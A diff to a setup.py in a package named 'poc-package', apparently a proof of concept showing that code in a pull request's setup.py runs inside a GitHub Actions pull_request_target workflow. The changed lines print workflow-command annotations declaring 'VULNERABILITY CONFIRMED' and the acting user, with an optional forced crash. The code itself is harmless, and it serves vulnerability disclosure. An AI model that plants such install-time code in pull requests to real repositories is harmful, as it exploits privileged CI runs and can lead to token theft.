@@ -1,13 +1,13 @@
+import os, sys
 from setuptools import setup
-import sys
-import os
 
-# Write to stderr to bypass azdev output capture
-sys.stderr.write("\n" + "!"*60 + "\n")
-sys.stderr.write("VULNERABILITY CONFIRMED: setup.py is running in pull_request_target\n")
-sys.stderr.write(f"Runner OS: {os.environ.get('RUNNER_OS')}\n")
-sys.stderr.write(f"GITHUB_TOKEN permissions: write-access enabled\n")
-sys.stderr.write("!"*60 + "\n\n")
+# ::error:: is a Workflow Command. It will show up as a bright red 
+# annotation in the GitHub Actions "Summary" tab and the log.
+print("::error title=VULNERABILITY CONFIRMED::setup.py is running in pull_request_target!")
+print(f"::warning::Actor: {os.environ.get('GITHUB_ACTOR')}")
+
+# Option: Force the job to fail (turn red) to prove execution
+# sys.exit("CRASH TEST: setup.py executed successfully")
 
 setup(
     name="poc-package",
